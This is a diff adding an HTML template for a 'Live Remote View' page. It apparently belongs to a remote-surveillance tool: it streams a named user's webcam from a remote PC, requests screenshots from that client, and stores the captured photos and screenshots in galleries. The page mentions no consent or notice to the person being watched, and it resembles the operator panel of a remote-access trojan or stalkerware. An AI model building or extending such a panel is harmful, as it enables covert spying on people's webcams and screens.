@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Live View - {{ username }}</title>
+    <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <style>
+        body {
+            background-color: #1e1e2f;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            max-width: 1200px;
+        }
+        h1, h2 {
+            color: #33ff57;
+            text-align: center;
+        }
+        .video-container {
+            border: 3px solid #33ff57;
+            border-radius: 8px;
+            background-color: #000;
+            position: relative;
+        }
+        #webcam-feed {
+            width: 100%;
+            height: auto;
+            display: block;
+            border-radius: 5px;
+        }
+        .controls {
+            text-align: center;
+            padding: 15px 0;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 10px;
+            margin-top: 20px;
+            background: #2a2a3a;
+            padding: 10px;
+            border-radius: 8px;
+            min-height: 180px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .gallery img {
+            width: 100%;
+            height: auto;
+            border-radius: 5px;
+            cursor: pointer;
+            border: 2px solid #4e4e7e;
+            transition: transform 0.2s;
+        }
+        .gallery img:hover {
+            transform: scale(1.05);
+            border-color: #33ff57;
+        }
+        .status {
+            text-align: center;
+            font-size: 1.1em;
+            padding: 10px;
+            height: 40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container mt-4">
+        <h1>Live Remote View</h1>
+        <h2>User: {{ username }} | PC: {{ pc_name }}</h2>
+
+        <div class="video-container mt-3">
+            <img id="webcam-feed" src="https://placehold.co/640x480/000000/33ff57?text=Connecting..." alt="Live Feed" />
+        </div>
+        <p class="status" id="status-text">Requesting stream from client...</p>
+
+        <div class="controls">
+            <button id="capture-photo-btn" class="btn btn-primary">Capture Photo</button>
+            <button id="capture-screen-btn" class="btn btn-info">Take Screenshot</button>
+        </div>
+
+        <div class="row mt-4">
+            <div class="col-md-6">
+                <h3>Captured Photos</h3>
+                <div id="photo-gallery" class="gallery"></div>
+            </div>
+            <div class="col-md-6">
+                <h3>Captured Screenshots</h3>
+                <div id="screenshot-gallery" class="gallery"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        const userId = "{{ user_id }}";
+        const statusText = document.getElementById("status-text");
+        const webcamFeed = document.getElementById("webcam-feed");
+        const photoGallery = document.getElementById("photo-gallery");
+        const screenshotGallery = document.getElementById("screenshot-gallery");
+
+        // --- Socket Event Listeners ---
+        socket.on("connect", () => {
+            console.log("Connected. Requesting webcam stream for", userId);
+            socket.emit("watch_webcam", { user_id: userId });
+            loadInitialMedia();
+        });
+
+        socket.on("webcam_stream", (data) => {
+            if (data.user_id === userId) {
+                webcamFeed.src = `data:image/jpeg;base64,${data.frame}`;
+                statusText.textContent = "Live Streaming...";
+            }
+        });
+        
+        socket.on("screenshot_stream", (data) => {
+            if (data.user_id === userId) {
+                // Immediately save the screenshot upon receipt
+                socket.emit("save_capture", {
+                    user_id: userId,
+                    type: 'screenshots',
+                    frame: data.frame
+                });
+                statusText.textContent = "Screenshot captured and saved.";
+            }
+        });
+
+        socket.on("client_not_connected", (data) => {
+            if (data.user_id === userId) {
+                statusText.textContent = "Client is offline or not responding.";
+                webcamFeed.src = "https://placehold.co/640x480/000000/ff5733?text=Client+Offline";
+            }
+        });
+        
+        socket.on("capture_saved", (data) => {
+            if (data.user_id === userId) {
+                console.log("Capture saved:", data.filename);
+                // Add the new image to the correct gallery
+                const gallery = data.type === 'photos' ? photoGallery : screenshotGallery;
+                const newImg = document.createElement('img');
+                newImg.src = `/view_media/${data.type}/${userId}/${data.filename}`;
+                newImg.alt = data.filename;
+                newImg.title = `Click to view ${data.filename}`;
+                newImg.onclick = () => window.open(newImg.src, '_blank');
+                gallery.prepend(newImg); // Add new captures to the top
+            }
+        });
+
+
+        // --- Button Click Handlers ---
+        document.getElementById("capture-photo-btn").addEventListener("click", () => {
+            const b64data = webcamFeed.src.split(',')[1];
+            if (b64data && !webcamFeed.src.includes('placehold.co')) {
+                socket.emit("save_capture", {
+                    user_id: userId,
+                    type: 'photos',
+                    frame: b64data
+                });
+                statusText.textContent = "Photo captured and saved.";
+            } else {
+                statusText.textContent = "Cannot capture photo, no active stream.";
+            }
+        });
+
+        document.getElementById("capture-screen-btn").addEventListener("click", () => {
+            statusText.textContent = "Requesting screenshot from client...";
+            socket.emit("request_screenshot", { user_id: userId });
+        });
+
+        // --- Utility Functions ---
+        function loadInitialMedia() {
+            // Function to populate a gallery
+            const populateGallery = (galleryElement, mediaType) => {
+                fetch(`/get_user_media/${mediaType}/${userId}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        galleryElement.innerHTML = ''; // Clear existing
+                        if (data.files && data.files.length > 0) {
+                            data.files.forEach(file => {
+                                const img = document.createElement('img');
+                                img.src = `/view_media/${mediaType}/${userId}/${file}`;
+                                img.alt = file;
+                                img.title = `Click to view ${file}`;
+                                img.onclick = () => window.open(img.src, '_blank');
+                                galleryElement.appendChild(img);
+                            });
+                        } else {
+                             galleryElement.innerHTML = '<p class="text-muted text-center w-100">No captures yet.</p>';
+                        }
+                    })
+                    .catch(err => {
+                        console.error(`Error loading ${mediaType}:`, err);
+                        galleryElement.innerHTML = `<p class="text-danger text-center w-100">Error loading media.</p>`;
+                    });
+            };
+            
+            // Load photos and screenshots
+            populateGallery(photoGallery, 'photos');
+            populateGallery(screenshotGallery, 'screenshots');
+        }
+
+        // --- Cleanup on exit ---
+        window.addEventListener("beforeunload", () => {
+            socket.emit("stop_watching_webcam", { user_id: userId });
+        });
+    </script>
+</body>
+</html>
+
